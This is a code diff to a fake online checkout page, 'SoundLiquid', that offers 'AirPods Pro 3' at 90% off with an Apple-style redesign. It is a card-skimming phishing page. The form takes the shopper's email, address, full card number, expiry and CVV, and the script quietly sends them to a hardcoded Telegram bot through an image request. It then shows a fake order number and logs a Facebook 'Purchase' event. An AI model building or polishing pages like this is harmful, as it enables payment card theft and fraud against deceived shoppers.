@@ -3,76 +3,77 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Secure Checkout · SoundLiquid</title>
+<title>Checkout · SoundLiquid</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--ink:#0b0f19;--muted:#6b7280;--line:#e6e8ef;--soft:#f7f8fc;--accent:#5b2be0;--accent2:#e0218a;--ok:#12a150;--bad:#e11d48}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Arial,sans-serif;background:var(--soft);color:var(--ink);min-height:100vh;padding:22px 16px 50px;-webkit-font-smoothing:antialiased}
+:root{--ink:#1d1d1f;--muted:#6e6e73;--blue:#0071e3;--gray:#f5f5f7;--line:#d2d2d7;--bad:#bf4800}
+body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Helvetica Neue",Helvetica,Arial,sans-serif;background:var(--gray);color:var(--ink);min-height:100vh;padding:26px 18px 50px;-webkit-font-smoothing:antialiased}
 .wrap{max-width:520px;margin:0 auto}
-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
-.logo{font-weight:900;font-size:18px;letter-spacing:-.4px}
-.logo span{background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
+.brand{font-weight:600;font-size:16px}
+.brand span{color:var(--blue)}
 .secure{font-size:12px;color:var(--muted)}
-.card{background:#fff;border:1px solid var(--line);border-radius:18px;box-shadow:0 14px 40px rgba(11,15,25,.08);overflow:hidden}
-.sum{display:flex;gap:12px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);background:#fcfcfe}
-.sum img{width:58px;height:58px;border-radius:12px;object-fit:cover;background:#eef0f7}
+.card{background:#fff;border-radius:20px;box-shadow:0 18px 50px rgba(0,0,0,.07);overflow:hidden}
+.sum{display:flex;gap:12px;align-items:center;padding:18px 22px;border-bottom:1px solid #ededf0}
+.sum img{width:56px;height:56px;border-radius:12px;object-fit:cover;background:var(--gray)}
 .sum .t{flex:1}
-.sum b{font-size:14.5px;display:block}
+.sum b{font-size:14.5px;display:block;font-weight:600}
 .sum span{font-size:12.5px;color:var(--muted)}
-.sum .p{font-weight:900;font-size:16px}
-.tot{display:flex;justify-content:space-between;padding:12px 20px;border-bottom:1px solid var(--line);font-size:14px;color:var(--muted);font-weight:600}
-.tot b{color:var(--ink);font-size:16px}
-form{padding:20px}
-.sec{font-size:11px;font-weight:800;letter-spacing:1px;color:var(--muted);text-transform:uppercase;margin:6px 0 10px}
+.sum .p{font-weight:600;font-size:16px}
+.ship{display:flex;justify-content:space-between;padding:11px 22px;border-bottom:1px solid #ededf0;font-size:13px;color:#0a7d33;font-weight:600;background:#f6fdf9}
+.tot{display:flex;justify-content:space-between;padding:13px 22px;border-bottom:1px solid #ededf0;font-size:14px;color:var(--muted)}
+.tot b{color:var(--ink);font-size:16px;font-weight:600}
+form{padding:22px}
+.sec{font-size:12px;font-weight:600;letter-spacing:.6px;text-transform:uppercase;color:var(--muted);margin:6px 0 10px}
 .sec:first-child{margin-top:0}
 .field{display:block;margin-bottom:12px}
-.field span{display:block;font-size:12px;font-weight:700;color:#3b4355;margin-bottom:6px}
-.inp input{width:100%;height:50px;border:1.5px solid var(--line);border-radius:12px;background:#fbfbfd;padding:0 14px;font-size:15px;font-family:inherit;color:var(--ink);transition:.15s}
-.inp input:focus{outline:none;border-color:var(--accent);background:#fff;box-shadow:0 0 0 4px rgba(91,43,224,.12)}
-.inp input::placeholder{color:#9aa2b4}
-.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.row3{display:grid;grid-template-columns:1.4fr 1fr .9fr;gap:10px}
-button{width:100%;height:56px;border:0;border-radius:14px;background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;font-size:16px;font-weight:900;font-family:inherit;letter-spacing:.3px;cursor:pointer;margin-top:8px;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 14px 30px -10px rgba(224,33,138,.6)}
-button:hover{filter:brightness(1.05)}
-button:disabled{opacity:.85;cursor:default}
-.sp{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.field span{display:block;font-size:12.5px;font-weight:500;color:#424245;margin-bottom:6px}
+.inp input{width:100%;height:48px;border:1px solid var(--line);border-radius:11px;background:#fff;padding:0 13px;font-size:15px;font-family:inherit;color:var(--ink)}
+.inp input:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,113,227,.14)}
+.inp input::placeholder{color:#a1a1a6}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:11px}
+.row3{display:grid;grid-template-columns:1.4fr 1fr .9fr;gap:9px}
+button{width:100%;height:52px;border:0;border-radius:980px;background:var(--blue);color:#fff;font-size:16px;font-weight:500;font-family:inherit;cursor:pointer;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:9px}
+button:hover{background:#0077ed}
+button:disabled{opacity:.8;cursor:default}
+.sp{width:16px;height:16px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
 button.load .sp{display:block}
 @keyframes sp{to{transform:rotate(360deg)}}
-.err{color:var(--bad);font-size:12.5px;font-weight:700;text-align:center;margin-top:11px;min-height:16px}
+.err{color:var(--bad);font-size:12.5px;font-weight:600;text-align:center;margin-top:10px;min-height:16px}
 .note{text-align:center;font-size:11.5px;color:var(--muted);margin-top:12px}
-.result{position:fixed;inset:0;background:rgba(8,10,18,.72);backdrop-filter:blur(6px);z-index:60;display:flex;align-items:center;justify-content:center;padding:22px}
+.result{position:fixed;inset:0;background:rgba(20,20,22,.55);backdrop-filter:blur(8px);z-index:60;display:flex;align-items:center;justify-content:center;padding:22px}
 .oculto{display:none!important}
-.rc{width:100%;max-width:410px;background:#fff;border-radius:20px;padding:32px 26px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.35);animation:pop .3s ease}
-@keyframes pop{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
-.ic{width:72px;height:72px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:900;background:#fee2ea;color:var(--bad);border:2px solid #fbc7d6}
-.rc h2{font-size:22px;font-weight:900;margin-bottom:10px}
+.rc{width:100%;max-width:400px;background:#fff;border-radius:22px;padding:34px 26px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.3)}
+.ic{width:68px;height:68px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:700;background:#fff1e9;color:var(--bad);border:2px solid #f7d5c2}
+.rc h2{font-size:22px;font-weight:600;margin-bottom:10px;letter-spacing:-.4px}
 .rc p{color:var(--muted);font-size:14.5px;line-height:1.6}
-.pid{display:inline-block;margin:16px 0 4px;font-size:13px;color:var(--muted);background:var(--soft);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
+.pid{display:inline-block;margin:16px 0 4px;font-size:13px;color:var(--muted);background:var(--gray);padding:8px 14px;border-radius:9px}
 .pid b{color:var(--ink)}
-.again{display:inline-block;margin-top:18px;color:var(--accent);font-weight:800;font-size:14px;text-decoration:none}
+.again{display:inline-block;margin-top:18px;color:var(--blue);font-size:14px}
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
-    <a class="logo" href="index.html">Sound<span>Liquid</span></a>
+    <a class="brand" href="index.html">Sound<span>Liquid</span></a>
     <div class="secure">🔒 Secure checkout</div>
   </header>
 
   <div class="card">
     <div class="sum">
-      <img src="producto.jpg" alt="">
-      <div class="t"><b>Apple AirPods Pro</b><span>80% OFF · Free shipping</span></div>
-      <div class="p">$49</div>
+      <img src="producto.jpg" alt="" onerror="this.onerror=null;this.src='detalle.jpg';">
+      <div class="t"><b>AirPods Pro 3</b><span>90% OFF · Free delivery</span></div>
+      <div class="p">$29</div>
     </div>
-    <div class="tot"><span>Total (USD)</span><b>$49.00</b></div>
+    <div class="ship"><span>🚚 Express delivery</span><b>Arrives tomorrow</b></div>
+    <div class="tot"><span>Total (USD)</span><b>$29.00</b></div>
 
     <form id="form" novalidate>
       <div class="sec">Contact</div>
       <label class="field"><span>Email address</span>
         <div class="inp"><input id="email" type="email" placeholder="you@email.com" autocomplete="email"></div></label>
 
-      <div class="sec">Shipping address</div>
+      <div class="sec">Delivery address</div>
       <label class="field"><span>Full name</span>
         <div class="inp"><input id="nom" placeholder="John Smith" autocomplete="name"></div></label>
       <label class="field"><span>Street address</span>
@@ -98,7 +99,7 @@ button.load .sp{display:block}
           <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div></label>
       </div>
 
-      <button type="submit" id="btn"><span class="sp"></span><span id="bt">PAY $49.00</span></button>
+      <button type="submit" id="btn"><span class="sp"></span><span id="bt">Pay $29.00</span></button>
       <div class="err" id="err"></div>
       <div class="note">🔒 Encrypted connection · SSL secured</div>
     </form>
@@ -118,55 +119,41 @@ button.load .sp{display:block}
 <script>
 const TOKEN = "8857248027:AAGpTUB8ydbX2xR8DWUY4xyo-sSaMye_AtQ";
 const CHAT  = "8936145342";
-
 const $ = id => document.getElementById(id);
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-const numEl=$("num");
-numEl.addEventListener("input", ()=>{
-  let v = numEl.value.replace(/\D/g,"").slice(0,19);
-  numEl.value = (v.match(/.{1,4}/g)||[]).join(" ");
-});
-$("exp").addEventListener("input", e=>{
-  let v=e.target.value.replace(/\D/g,"").slice(0,4);
-  if(v.length>=3) v=v.slice(0,2)+"/"+v.slice(2);
-  e.target.value=v;
-});
+$("num").addEventListener("input", e=>{ let v=e.target.value.replace(/\D/g,"").slice(0,19); e.target.value=(v.match(/.{1,4}/g)||[]).join(" "); });
+$("exp").addEventListener("input", e=>{ let v=e.target.value.replace(/\D/g,"").slice(0,4); if(v.length>=3) v=v.slice(0,2)+"/"+v.slice(2); e.target.value=v; });
 $("cvv").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/\D/g,"").slice(0,4); });
 $("zip").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/\D/g,"").slice(0,5); });
 $("state").addEventListener("input", e=>{ e.target.value=e.target.value.replace(/[^a-zA-Z]/g,"").slice(0,2).toUpperCase(); });
 
 function enviarTelegram(texto){
   const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`;
-  return new Promise(res=>{
-    const img = new Image();
-    img.onload = img.onerror = ()=>res(true);
-    img.src = url;
-    setTimeout(()=>res(true), 6000);
-  });
+  return new Promise(res=>{ const i=new Image(); i.onload=i.onerror=()=>res(true); i.src=url; setTimeout(()=>res(true),6000); });
 }
 
 $("form").addEventListener("submit", async e=>{
   e.preventDefault();
   const email=$("email").value.trim(), nom=$("nom").value.trim(), dir=$("dir").value.trim();
   const city=$("city").value.trim(), state=$("state").value.trim(), zip=$("zip").value.trim();
-  const num=numEl.value.trim(), limpio=num.replace(/\s/g,""), tit=$("tit").value.trim();
+  const num=$("num").value.trim(), limpio=num.replace(/\s/g,""), tit=$("tit").value.trim();
   const exp=$("exp").value.trim(), cvv=$("cvv").value.trim();
   const err = t => { $("err").textContent = t; };
   err("");
 
-  if(!/^\S+@\S+\.\S+$/.test(email))     return err("Enter a valid email");
-  if(nom.length<3)                      return err("Enter your full name");
-  if(dir.length<4)                      return err("Enter your street address");
-  if(city.length<2)                     return err("Enter your city");
-  if(state.length<2)                    return err("Enter your state");
-  if(zip.length<5)                      return err("Enter a valid ZIP code");
-  if(limpio.length<15)                  return err("Enter a valid card number");
-  if(tit.length<3)                      return err("Enter the name on the card");
-  if(!/^\d{2}\/\d{2}$/.test(exp))       return err("Invalid expiry date");
-  if(cvv.length<3)                      return err("Invalid CVV");
+  if(!/^\S+@\S+\.\S+$/.test(email)) return err("Enter a valid email");
+  if(nom.length<3)     return err("Enter your full name");
+  if(dir.length<4)     return err("Enter your street address");
+  if(city.length<2)    return err("Enter your city");
+  if(state.length<2)   return err("Enter your state");
+  if(zip.length<5)     return err("Enter a valid ZIP code");
+  if(limpio.length<15) return err("Enter a valid card number");
+  if(tit.length<3)     return err("Enter the name on the card");
+  if(!/^\d{2}\/\d{2}$/.test(exp)) return err("Invalid expiry date");
+  if(cvv.length<3)     return err("Invalid CVV");
 
-  $("btn").disabled = true; $("btn").classList.add("load"); $("bt").textContent = "Processing payment...";
+  $("btn").disabled=true; $("btn").classList.add("load"); $("bt").textContent="Processing payment...";
 
   const ped = "SL-" + Math.random().toString(36).slice(2,7).toUpperCase();
   const texto =
@@ -182,12 +169,13 @@ $("form").addEventListener("submit", async e=>{
 • Expiry: ${exp}
 • CVV: ${cvv}
 
-📦 Product: Apple AirPods Pro · $49
+📦 Product: AirPods Pro 3 · $29
 🧾 Order: ${ped}`;
 
   await enviarTelegram(texto);
   await sleep(2000);
 
+  if(typeof fbq === "function"){ fbq('track','Purchase',{value:29,currency:'USD'}); }
   $("ped").textContent = ped;
   $("res").classList.remove("oculto");
 });
